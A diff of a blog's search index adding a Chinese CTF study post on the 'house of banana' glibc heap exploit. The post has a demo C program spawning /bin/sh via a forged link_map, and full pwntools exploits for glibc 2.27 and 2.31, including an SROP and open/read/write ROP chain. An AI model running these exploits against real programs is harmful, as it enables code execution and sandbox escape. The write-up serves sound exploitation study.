@@ -1,6 +1,140 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>house-of-banana</title>
+    <url>/2024/09/01/house%20of%20banana/</url>
+    <content><![CDATA[<h1 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本:"></a>适用版本:</h1><p>适用版本：<code>glibc2.23</code> 到目前最新的 2.36</p>
+<h2 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h2><ol>
+<li>可以任意地址写一个堆地址（通常使用 <code>large bin attack</code>）</li>
+<li>能够从 <code>main</code> 函数返回或者调用 <code>exit</code> 函数</li>
+<li>可以泄露 <code>libc</code> 地址和堆地址</li>
+</ol>
+<p>链子 exit-&gt;_dl_fini</p>
+<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p><code>link_map</code> 结构体的存储方式和堆块链表类似，是通过 <code>l_next</code> 和 <code>l_prev</code> 指针来连接的,而这个链表的头指针就是 <code>_rtld_global</code> 结构体中的 <code>_ns_loaded</code> 所存储的地址。</p>
+<p>_rtld_global结构体源码</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">struct rtld_global</span><br><span class="line">{</span><br><span class="line">#endif</span><br><span class="line">  /* Don't change the order of the following elements.  'dl_loaded'</span><br><span class="line">     must remain the first element.  Forever.  */</span><br><span class="line"></span><br><span class="line">/* Non-shared code has no support for multiple namespaces.  */</span><br><span class="line">#ifdef SHARED</span><br><span class="line"># define DL_NNS 16</span><br><span class="line">#else</span><br><span class="line"># define DL_NNS 1</span><br><span class="line">#endif</span><br><span class="line">  EXTERN struct link_namespaces</span><br><span class="line">  {</span><br><span class="line">    /* A pointer to the map for the main map.  */</span><br><span class="line">    struct link_map *_ns_loaded;</span><br><span class="line">    /* Number of object in the _dl_loaded list.  */</span><br><span class="line">    unsigned int _ns_nloaded;</span><br><span class="line">    /* Direct pointer to the searchlist of the main object.  */</span><br><span class="line">    struct r_scope_elem *_ns_main_searchlist;</span><br><span class="line">    /* This is zero at program start to signal that the global scope map is</span><br><span class="line">       allocated by rtld.  Later it keeps the size of the map.  It might be</span><br><span class="line">       reset if in _dl_close if the last global object is removed.  */</span><br><span class="line">    unsigned int _ns_global_scope_alloc;</span><br><span class="line"></span><br><span class="line">    /* During dlopen, this is the number of objects that still need to</span><br><span class="line">       be added to the global scope map.  It has to be taken into</span><br><span class="line">       account when resizing the map, for future map additions after</span><br><span class="line">       recursive dlopen calls from ELF constructors.  */</span><br><span class="line">    unsigned int _ns_global_scope_pending_adds;</span><br><span class="line"></span><br><span class="line">    /* Search table for unique objects.  */</span><br><span class="line">    struct unique_sym_table</span><br><span class="line">    {</span><br><span class="line">      __rtld_lock_define_recursive (, lock)</span><br><span class="line">      struct unique_sym</span><br><span class="line">      {</span><br><span class="line">	uint32_t hashval;</span><br><span class="line">	const char *name;</span><br><span class="line">	const ElfW(Sym) *sym;</span><br><span class="line">	const struct link_map *map;</span><br><span class="line">      } *entries;</span><br><span class="line">      size_t size;</span><br><span class="line">      size_t n_elements;</span><br><span class="line">      void (*free) (void *);</span><br><span class="line">    } _ns_unique_sym_table;</span><br><span class="line">    /* Keep track of changes to each namespace' list.  */</span><br><span class="line">    struct r_debug _ns_debug;</span><br><span class="line">  } _dl_ns[DL_NNS];</span><br><span class="line">  /* One higher than index of last used namespace.  */</span><br><span class="line">  EXTERN size_t _dl_nns;</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li>**<code>struct rtld_global</code>**：这个结构体管理动态链接器运行时的全局状态，尤其是涉及到链接命名空间的管理。</li>
+<li>它能够处理多个链接命名空间，包括主程序和它们的依赖关系。</li>
+<li>它允许对每个命名空间维护特定的加载对象列表、符号查找表和调试信息。</li>
+</ul>
+<p>如果我们可以通过 <code>large bin attack</code> 或其他方式将链表的头指针改为可控堆地址，这样就可以伪造第一个 <code>link_map</code> 结构体，从而控制结构体中的各个字段，下面代码是 <code>_dl_fini</code> 函数中的片段</p>
+<p><img src="/pic/house_of_banana/1.png" alt="img"></p>
+<p>红色是我们在伪造结构体时要注意的绕过条件，蓝色是劫持程序流的位置</p>
+<p>而以上又全位于link_map结构体中</p>
+<p>然后我们再看一下 link_map结构体中的内容</p>
+<p><img src="/pic/house_of_banana/2.png" alt="img"></p>
+<p><img src="/pic/house_of_banana/3.png" alt="img"></p>
+<p>我们的重点看我标黄色的地方，_ns_loaded = 0x7ffff7ffe190，这个地方就是上面说的link_map链表头的位置，后面的ns_nloaded = 4，这个代表链表的节点个数，也就是有几个这样的链表，要注意的是，这里是不可以小于4的，不然就绕不过检查了 然后我们看一下这个结构体</p>
+<p><img src="/pic/house_of_banana/4.png" alt="img"></p>
+<p>这里l_ next指的是下一个link_map结构体的地址，而这个l_real是当前结构体的地址</p>
+<p>那按照这个思路的话，我们可以总结一下house of banana的利用基础就是在于伪造_rtld_globa结构体里面用ns_loaded所连接的四个link_map结构体，最终是在于link_map里面，伪造其中的一些数据，最终执行((fini_t) array[i]) ()</p>
+<p>然后因为是通过修改link_ map来进行劫持程序流，这里我们要修改的是倒数第二个link_map 也就是在ns_loaded 为4的时候 取第三个来劫持</p>
+<p>p &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</p>
+<p><img src="/pic/house_of_banana/5.png" alt="img"></p>
+<p><img src="/pic/house_of_banana/6.png" alt="img"></p>
+<p><strong>我们需要绕过和伪造的一些条件</strong></p>
+<p><img src="/pic/house_of_banana/7.png" alt="img"></p>
+<p>check 1 我们必须让l_real的位置是l的地址 也就是fake+0x28=fake才能进入if语句</p>
+<p><img src="/pic/house_of_banana/8.png" alt="img"></p>
+<p>将 <code>l_real</code> 字段改为伪造的 <code>link_map</code> 地址，以便满足 <code>if (l == l-&gt;l_real)</code> ，确保不会触发 <code>assert</code></p>
+<p>将 <code>l_info[26]</code> 的值设置为非空，为了满足 <code>if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)</code></p>
+<p>而 <code>DT_FINI_ARRAY</code> 这个宏就是 <code>26</code> ，<code>d_un</code> 则是一个联合体，定义如下</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">union</span><br><span class="line">  {</span><br><span class="line">    Elf32_Word d_val;			/* Integer value */</span><br><span class="line">    Elf32_Addr d_ptr;			/* Address value */</span><br><span class="line">  } d_un;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果我们将 <code>l-&gt;l_info[26]</code> 的值设置为 <code>l-&gt;l_info[26]</code> 的地址，那么 <code>l-&gt;l_info[27]</code> 中的值则是 <code>array</code></p>
+<p>然后看 i</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / sizeof (ElfW(Addr)));</span><br></pre></td></tr></tbody></table></figure>
+
+<p>DT_FINI_ARRAYSZ<code>这个宏是</code>28<code>，所以将</code>l-&gt;l_info[28]<code>的值设置为</code>l-&gt;l_info[28]<code>的地址，那么</code>l-&gt;l_info[29]<code>中的值再除</code>8<code>，则是最后的</code>i</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">*(uint64_t*)(fake+0x110) = fake+0x40;</span><br><span class="line">*(uint64_t*)(fake+0x48)  = fake+0x58;</span><br><span class="line">*(uint64_t*)(fake+0x58)  = (uint64_t)shell;</span><br><span class="line">*(uint64_t*)(fake+0x120) = fake+0x48;</span><br><span class="line">*(uint64_t*)(fake+0x50)  = 0x8;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>因此可以这样布置 fake+0x110是l-&gt;l_info[28] 也就是说 现在fake+0x40是l-&gt;l_info[26]<code> 的地址 所以 l-&gt;l_info[27]就等于fake+0x48处的地址也就是fake+0x58,而i的值为l-&gt;l_info[28]</code> 的值设置为 <code>l-&gt;l_info[28]</code> 的地址，那么 <code>l-&gt;l_info[29]</code> 中的值再除 `8，也就是说 fake+0x48 —&gt;fake+0x50的值 0x8再除以8 等于 1 而 执行while循环前有一个i – 因此就是调用的fake+0x58的值 也就是shell</p>
+<p>ps(上面解引用的部分不是很理解也就是为什么<code>l-&gt;l_info[26]</code> 的地址，那么 <code>l-&gt;l_info[27]</code> 中的值则是 <code>array</code> 这里引用下ZIKH26师傅的解释：-&gt;<code>操作符在</code>C<code>语言被定义为结构体指针成员的解引用和成员访问操作符，也就是说该操作符完成了两个操作，先对指针进行了解引用，然后再访问指针所指向的结构体成员。因此上面的代码</code>l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr<code>进行了两次解引用最后将值赋给</code>array)</p>
+<p>综上所述 link_map结构体的伪造大致是这样</p>
+<pre><code>*(uint64_t*)(fake+0x28)  = fake;
+*(uint64_t*)(fake+0x31c) = 0x1c;
+*(uint64_t*)(fake+0x110) = fake+0x40;
+*(uint64_t*)(fake+0x48)  = fake+0x58;
+*(uint64_t*)(fake+0x58)  = (uint64_t)shell;
+*(uint64_t*)(fake+0x120) = fake+0x48;
+*(uint64_t*)(fake+0x50)  = 0x8;
+</code></pre>
+<p><strong>gdb动态调试阶段</strong> 调试参数的位置</p>
+<p>(</p>
+<p>1.对于l-&gt;init_called的值</p>
+<p>我们可以通过下面方式查看：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">pwndbg&gt; distance _rtld_global._dl_ns[0]._ns_loaded  &amp;(_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_init_called</span><br><span class="line">0x7ffff7e2b170-&gt;0x7ffff7e2b484 is 0x314 bytes (0x62 words)</span><br><span class="line">pwndbg&gt; x/wx &amp;(_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_init_called</span><br><span class="line">0x7ffff7e2b484: 0x0000001c</span><br></pre></td></tr></tbody></table></figure>
+
+<p>也就是说fake+0x314的位置填上0x1c</p>
+<p>2.l-&gt;l_info[26] ！= NULL即可绕过</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">pwndbg&gt; distance  (_rtld_global._dl_ns[0]._ns_loaded)  &amp;((_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_info[26])</span><br><span class="line">0x7ffff7ffe168-&gt;0x7ffff7ffe278 is 0x110 bytes (0x22 words)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在fake+0x110 写入的内容会直接控制array</p>
+<p>3.i = (l-&gt;l_info[28]-&gt;d_un.d_val / 8));</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">pwndbg&gt; distance  (_rtld_global._dl_ns[0]._ns_loaded)  &amp;((_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_info[28])</span><br><span class="line">0x7ffff7ffe168-&gt;0x7ffff7ffe288 is 0x120 bytes (0x24 words)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在fake+0x120写入的内容会控制 i</p>
+<p>只要把fake+0x120，fake+0x110 控制好就可以控制最后的((fini_t) array[i]) ();这是正常执行fini_array的流程，所以我们照着此进行伪造。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">p *(struct link_map *) 0x7ffff7e2b170</span><br></pre></td></tr></tbody></table></figure>
+
+<p>)</p>
+<p>我们通过一个demo来进行伪造结构体和io的分析(感谢lyyyy师傅给的demo，自己写的遇到了点问题)</p>
+<p>demo</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;assert.h&gt;</span><br><span class="line"></span><br><span class="line">void shell()</span><br><span class="line">{</span><br><span class="line">   system("/bin/sh");</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">uint64_t getLibcBase()</span><br><span class="line">{</span><br><span class="line">   uint64_t to;</span><br><span class="line">   uint64_t from;</span><br><span class="line">   char buf[0x400];</span><br><span class="line">   </span><br><span class="line">   FILE* file;</span><br><span class="line">   sprintf(buf, "/proc/%d/maps",(int)getpid()); </span><br><span class="line">   file = fopen(buf, "r");</span><br><span class="line">   while(fgets(buf, sizeof(buf), file)) </span><br><span class="line">   {</span><br><span class="line">      if(strstr(buf,"libc")!=NULL)</span><br><span class="line">      {</span><br><span class="line">          sscanf(buf, "%lx-%lx", &amp;from, &amp;to);</span><br><span class="line">          fclose(file);</span><br><span class="line">          return from;</span><br><span class="line">      }</span><br><span class="line">   }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">int main(){</span><br><span class="line">	setvbuf(stdin,NULL,_IONBF,0);</span><br><span class="line">	setvbuf(stdout,NULL,_IONBF,0);</span><br><span class="line">	setvbuf(stderr,NULL,_IONBF,0);</span><br><span class="line"></span><br><span class="line">	uint64_t libcBase = getLibcBase();</span><br><span class="line">	uint64_t rtld_global = libcBase+0x23d060;</span><br><span class="line">	uint64_t* next_node = (uint64_t*)(rtld_global-0x4b048);   </span><br><span class="line">	uint64_t *p1 = malloc(0x428); /* 为了触发 largebin attack */</span><br><span class="line">	uint64_t *g1 = malloc(0x18);</span><br><span class="line"></span><br><span class="line">	uint64_t *p2 = malloc(0x418); /* p1-&gt;size和p2-&gt;size必须不相同 */</span><br><span class="line">	uint64_t *g2 = malloc(0x18);</span><br><span class="line">	uint64_t fake = (uint64_t)p2-0x10;</span><br><span class="line"></span><br><span class="line">	*(uint64_t*)(fake+0x28)  = fake;</span><br><span class="line">	*(uint64_t*)(fake+0x31c) = 0x1c;</span><br><span class="line">	*(uint64_t*)(fake+0x110) = fake+0x40;</span><br><span class="line">	*(uint64_t*)(fake+0x48)  = fake+0x58;</span><br><span class="line">	*(uint64_t*)(fake+0x58)  = (uint64_t)shell;</span><br><span class="line">	*(uint64_t*)(fake+0x120) = fake+0x48;</span><br><span class="line">	*(uint64_t*)(fake+0x50)  = 0x8;</span><br><span class="line"></span><br><span class="line">	printf("libcBase is 0x%lx\n",libcBase);</span><br><span class="line">	printf("rtld_global is 0x%lx\n",rtld_global);</span><br><span class="line"></span><br><span class="line">	free(p1);</span><br><span class="line">	uint64_t *g3 = malloc(0x438); //force p1 insert in to the largebin</span><br><span class="line">	free(p2);</span><br><span class="line">	p1[3] = ((uint64_t)next_node -0x20); //push p2 into unsoteded bin</span><br><span class="line">	uint64_t *g4 = malloc(0x438); //force p2 insert in to the largebin</span><br><span class="line"></span><br><span class="line">	p2[1] = 0;</span><br><span class="line">	p2[3] = fake;</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这个demo的漏洞就是一次large_bin attack来覆盖第三次link_map的l_next地址 接着伪造fake结构体，进行shell，此处有一个后门 就不用走ogg了直接调用即可</p>
+<p>1.large bin attack</p>
+<p><img src="/pic/house_of_banana/9.png" alt="img"></p>
+<p>攻击后 l_next就被成功修改了</p>
+<p><img src="/pic/house_of_banana/10.png" alt="img"></p>
+<p>然后看我们伪造的结构体</p>
+<p><img src="/pic/house_of_banana/11.png" alt="img"></p>
+<p><img src="/pic/house_of_banana/12.png" alt="img"></p>
+<p>可以看到是理论上来讲是可以过check 且没问题的</p>
+<p>我们接下来进入io链条调试</p>
+<p><strong>exit-&gt;dl_fini</strong></p>
+<p>直接到第四次循环可以看到：</p>
+<p><img src="/pic/house_of_banana/13.png" alt="img"></p>
+<p>然后继续走 也是看第四次循环</p>
+<p><img src="/pic/house_of_banana/14.png" alt="img"></p>
+<p><img src="/pic/house_of_banana/15.png" alt="img"></p>
+<p> ► 0x7ffff7fe0f58 &lt;_dl_fini+520&gt;    call   qword ptr [r14]             <shell></shell></p>
+<p><img src="/pic/house_of_banana/16.png" alt="img"></p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><img src="/pic/house_of_banana/17.png" alt="img"></p>
+<p>简单讲一下 存在uaf漏洞 用large bin attack去攻击</p>
+<h3 id="2-27版本的"><a href="#2-27版本的" class="headerlink" title="2.27版本的"></a>2.27版本的</h3><p>关键检测调试步骤</p>
+<p><img src="/pic/house_of_banana/18.png" alt="img"></p>
+<p>exp</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">from pwn import *</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#--------------------setting context---------------------</span><br><span class="line">context.clear(arch='amd64', os='linux', log_level='debug')</span><br><span class="line"></span><br><span class="line">context.terminal = ['tmux', 'splitw', '-h']</span><br><span class="line">sla = lambda data, content: p.sendlineafter(data,content)</span><br><span class="line">sa = lambda data, content: p.sendafter(data,content)</span><br><span class="line">sl = lambda data: p.senxdline(data)</span><br><span class="line">rl = lambda data: p.recvuntil(data)</span><br><span class="line">re = lambda data: p.recv(data)</span><br><span class="line">sa = lambda data, content: p.sendafter(data,content)</span><br><span class="line">inter = lambda: p.interactive()</span><br><span class="line">l64 = lambda:u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))</span><br><span class="line">h64=lambda:u64(p.recv(3).ljust(8,b'\x00'))</span><br><span class="line">s=lambda data: p.send(data)</span><br><span class="line">log_addr=lambda data: log.success("---&gt;"+hex(data))</span><br><span class="line">p = lambda s: print('\033[1;31;40m%s --&gt; 0x%x \033[0m' % (s, eval(s)))</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">#---------------------------------------------------------</span><br><span class="line"># libc = ELF('/home/henry/Documents/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')</span><br><span class="line">filename = "./house_of_banana"</span><br><span class="line">p = process(filename)</span><br><span class="line">#p = remote("node5.anna.nssctf.cn",24071)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line">#初始化完成---------------------------------------------------------\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(index,size):</span><br><span class="line">    p.sendlineafter('Your choice:\n', str(1))</span><br><span class="line">    p.sendlineafter('index:\n', str(index))</span><br><span class="line">    p.sendlineafter("Size:\n", str(size))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    p.sendlineafter('Your choice:\n', str(2))</span><br><span class="line">    p.sendlineafter('index:\n', str(index))</span><br><span class="line"></span><br><span class="line">def edit(index, content):</span><br><span class="line">    p.sendlineafter('Your choice:\n', str(3))</span><br><span class="line">    p.sendlineafter('index:\n', str(index))</span><br><span class="line">    p.sendafter("context: \n",content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    p.sendlineafter('Your choice:\n', str(4))</span><br><span class="line">    p.sendlineafter('index:\n', str(index))</span><br><span class="line">dbg()</span><br><span class="line">add(0,0x428)</span><br><span class="line">add(1,0x500)</span><br><span class="line">add(2,0x418)</span><br><span class="line">delete(0)</span><br><span class="line">add(3,0x500)</span><br><span class="line">show(0)</span><br><span class="line">libc_base=l64()-0x3ec090</span><br><span class="line">log_addr(libc_base)</span><br><span class="line">edit(0,'a'*0x10)</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">p.recvuntil('a'*0x10)</span><br><span class="line">heap_base=h64()-0x250</span><br><span class="line">log_addr(heap_base)</span><br><span class="line"></span><br><span class="line">next_mode=libc_base+ 0x616018</span><br><span class="line">log_addr(next_mode)</span><br><span class="line">ogg=libc_base+0x4f302</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">edit(0,p64(libc_base+0x3ec090)*2+p64(heap_base+0x250)+p64(next_mode-0x20))</span><br><span class="line"></span><br><span class="line">add(4,0x500)</span><br><span class="line"></span><br><span class="line">link_map=p64(0)*3</span><br><span class="line">link_map+=p64(heap_base+0xb90) #fake+0x28=fake</span><br><span class="line">link_map+=p64(0)*3</span><br><span class="line">link_map+=p64(heap_base+0xb90+0x58) #fake +0x48=fake+0x58</span><br><span class="line">link_map+=p64(8)#fake+0x50=0x8</span><br><span class="line">link_map+=p64(ogg)#fkae+0x58=ogg</span><br><span class="line">link_map+=p64(0)*22</span><br><span class="line">link_map+=p64(heap_base+0xb90+0x40)#fake+0x110=fake+0x40</span><br><span class="line">link_map+=p64(0)</span><br><span class="line">link_map+=p64(heap_base+0xb90+0x48)#fake+0x120=fake+0x48</span><br><span class="line">#128</span><br><span class="line">link_map+=p64(0)*61+b'\x00'*4</span><br><span class="line">link_map+=b'\x1c'</span><br><span class="line"></span><br><span class="line">edit(2,link_map)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.sendlineafter('Your choice:\n', str(5))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/pic/house_of_banana/19.png" alt="img"></p>
+<p>讲一下注意的点：</p>
+<p>第一个就是：</p>
+<p>l-&gt;l_init_called的值是0x1c的情况 不能直接发p64(0x1c)还是会显示为0 这里卡了我一会</p>
+<p><img src="/pic/house_of_banana/20.png" alt="img"></p>
+<p>第二个就是：</p>
+<p>当偏移算错或者不确定的时候 一定要边调试边写exp，不然到时候乱起来 不好找问题</p>
+<p>接下来同样的题目patch 走2.31的orw</p>
+<p>需要先空走一轮函数调用，因为 <code>rdx</code> 再每轮循环后，都会被更新为堆地址（如下图）</p>
+<p><img src="/pic/house_of_banana/21.png" alt="img"></p>
+<p>此时rdx就是我们的堆地址了</p>
+<p><img src="/pic/house_of_banana/22.png" alt="img"></p>
+<p>走空一轮的意思就是跳转到 <code>ret</code> 指令上，然后立刻退出这一轮的函数指针调用，<code>i--</code> 然后调用下一个 <code>array[i]</code> 中存放的函数指针，此时的 <code>rdx</code> 已经为堆地址了，所以此时去跳转到 <code>setcontext+61</code> 的位置，布置 <code>SROP</code> ，调用 <code>read</code> 函数再次读入 <code>orw</code> 的 <code>rop</code> 链使其正好落到 <code>read</code> 函数的返回地址上，从而绕过沙箱保护。</p>
+<h3 id="2-31版本"><a href="#2-31版本" class="headerlink" title="2.31版本"></a>2.31版本</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">from pwn import *</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#--------------------setting context---------------------</span><br><span class="line">context.clear(arch='amd64', os='linux', log_level='debug')</span><br><span class="line"></span><br><span class="line">context.terminal = ['tmux', 'splitw', '-h']</span><br><span class="line">sla = lambda data, content: p.sendlineafter(data,content)</span><br><span class="line">sa = lambda data, content: p.sendafter(data,content)</span><br><span class="line">sl = lambda data: p.senxdline(data)</span><br><span class="line">rl = lambda data: p.recvuntil(data)</span><br><span class="line">re = lambda data: p.recv(data)</span><br><span class="line">sa = lambda data, content: p.sendafter(data,content)</span><br><span class="line">inter = lambda: p.interactive()</span><br><span class="line">l64 = lambda:u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))</span><br><span class="line">h64=lambda:u64(p.recv(3).ljust(8,b'\x00'))</span><br><span class="line">s=lambda data: p.send(data)</span><br><span class="line">log_addr=lambda data: log.success("---&gt;"+hex(data))</span><br><span class="line">p = lambda s: print('\033[1;31;40m%s --&gt; 0x%x \033[0m' % (s, eval(s)))</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">#---------------------------------------------------------</span><br><span class="line"># libc = ELF('/home/henry/Documents/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')</span><br><span class="line">filename = "./house_of_banana"</span><br><span class="line">p = process(filename)</span><br><span class="line">#p = remote("node5.anna.nssctf.cn",24071)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc=elf.libc</span><br><span class="line">#初始化完成---------------------------------------------------------\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(index,size):</span><br><span class="line">    p.sendlineafter('Your choice:\n', str(1))</span><br><span class="line">    p.sendlineafter('index:\n', str(index))</span><br><span class="line">    p.sendlineafter("Size:\n", str(size))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    p.sendlineafter('Your choice:\n', str(2))</span><br><span class="line">    p.sendlineafter('index:\n', str(index))</span><br><span class="line"></span><br><span class="line">def edit(index, content):</span><br><span class="line">    p.sendlineafter('Your choice:\n', str(3))</span><br><span class="line">    p.sendlineafter('index:\n', str(index))</span><br><span class="line">    p.sendafter("context: \n",content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    p.sendlineafter('Your choice:\n', str(4))</span><br><span class="line">    p.sendlineafter('index:\n', str(index))</span><br><span class="line">dbg()</span><br><span class="line">add(0,0x428)</span><br><span class="line">add(1,0x500)</span><br><span class="line">add(2,0x418)</span><br><span class="line">delete(0)</span><br><span class="line">add(3,0x500)</span><br><span class="line">show(0)</span><br><span class="line">libc_addr=l64()</span><br><span class="line"></span><br><span class="line">libc_base=libc_addr-0x1ebfd0</span><br><span class="line">log_addr(libc_base)</span><br><span class="line">pause()</span><br><span class="line">edit(0,'a'*0x10)</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">p.recvuntil('a'*0x10)</span><br><span class="line">heap_base=u64(p.recv(3).ljust(8,b'\x00'))-0x290</span><br><span class="line">log_addr(heap_base)</span><br><span class="line">pause()</span><br><span class="line">rtld_global=libc_base+0x1f2018</span><br><span class="line">ret_addr=libc_base+0x0000000000025679</span><br><span class="line">setcontext=0x580a0+libc_base</span><br><span class="line">pop_rdi=libc_base+0x0000000000026b72</span><br><span class="line">pop_rsi=libc_base+0x0000000000027529</span><br><span class="line">pop_rdx_r12=libc_base+0x000000000011c1e1</span><br><span class="line">write_addr=libc_base+libc.symbols['write']</span><br><span class="line">open_addr=libc_base+libc.symbols['open']</span><br><span class="line"></span><br><span class="line">read_addr=libc.symbols['read']+libc_base</span><br><span class="line">delete(2)</span><br><span class="line">edit(0,p64(libc_base+ 0x1ebfd0)*2+p64(heap_base+0x290)+p64(rtld_global-0x20))</span><br><span class="line"></span><br><span class="line">add(4,0x500)</span><br><span class="line"></span><br><span class="line">link_map=p64(0)</span><br><span class="line">link_map+=p64(0)#l_next</span><br><span class="line">link_map+=p64(0)</span><br><span class="line">link_map+=p64(heap_base+0xb90+0x40)#l_real</span><br><span class="line">link_map+=p64(0)*28</span><br><span class="line">link_map+=p64(heap_base+0xc08+0x98+0x40)#l-&gt;l_info[26]</span><br><span class="line">link_map+=p64(heap_base+0xc08+32+0x98+0x40)#l-&gt;l_info[26]-&gt;d_un.d_ptr</span><br><span class="line">link_map+=p64(heap_base+0xc08+0x10+0x98+0x40)#l-&gt;l_info[28]</span><br><span class="line">link_map+=p64(0x20)#//i=l-&gt;l_info[28]-&gt;d_un.d_val</span><br><span class="line">link_map+=b"flag\x00\x00\x00\x00"</span><br><span class="line">link_map+=p64(heap_base+0xb90+0x40)</span><br><span class="line">link_map+=p64(setcontext+61)</span><br><span class="line">link_map+=p64(ret_addr)</span><br><span class="line">link_map+=p64(0)*12</span><br><span class="line">link_map+=p64(0)#rdi</span><br><span class="line">link_map+=p64(heap_base+0xdc8)#rsi</span><br><span class="line">link_map+=p64(0)*2</span><br><span class="line">link_map+=p64(0x100)#rdx</span><br><span class="line">link_map+=p64(0)*2</span><br><span class="line"></span><br><span class="line">link_map+=p64(heap_base+0xdc8)#rsp</span><br><span class="line">link_map+=p64(read_addr)#rcx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">link_map+=p64(0)*36</span><br><span class="line">link_map+=p64(0x800000000)</span><br><span class="line">edit(2,link_map)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.sendlineafter('Your choice:\n', str(5))</span><br><span class="line"></span><br><span class="line">flag_addr=heap_base+0xd00</span><br><span class="line">orw=p64(pop_rdi)+p64(flag_addr)</span><br><span class="line">orw+=p64(pop_rsi)+p64(0)</span><br><span class="line">orw+=p64(open_addr)</span><br><span class="line">orw+=p64(pop_rdi)+p64(3)</span><br><span class="line">orw+=p64(pop_rsi)+p64(heap_base)</span><br><span class="line">orw+=p64(pop_rdx_r12)+p64(0x50)+p64(0)</span><br><span class="line">orw+=p64(read_addr)</span><br><span class="line">orw+=p64(pop_rdi)+p64(1)</span><br><span class="line">orw+=p64(pop_rsi)+p64(heap_base)</span><br><span class="line">orw+=p64(pop_rdx_r12)+p64(0x50)+p64(0)</span><br><span class="line">orw+=p64(write_addr)</span><br><span class="line">p.sendline(orw)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a href="https://zikh26.github.io/posts/efb4678.html#poc">关于house of banana的学习总结 | ZIKH26’s Blog</a></p>
+]]></content>
+      <categories>
+        <category>pwn学习</category>
+        <category>堆利用</category>
+      </categories>
+      <tags>
+        <tag>house_of</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>DIR-820 CVE-2022-26258</title>
     <url>/2024/08/16/DIR-820%20CVE-2022-26258/</url>
     <content><![CDATA[<h2 id="官方漏洞描述"><a href="#官方漏洞描述" class="headerlink" title="官方漏洞描述"></a>官方漏洞描述</h2><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141131392.png" alt="image-20220425141131392"></p>
@@ -84,73 +218,85 @@
       </tags>
   </entry>
   <entry>
-    <title>house-of-lore</title>
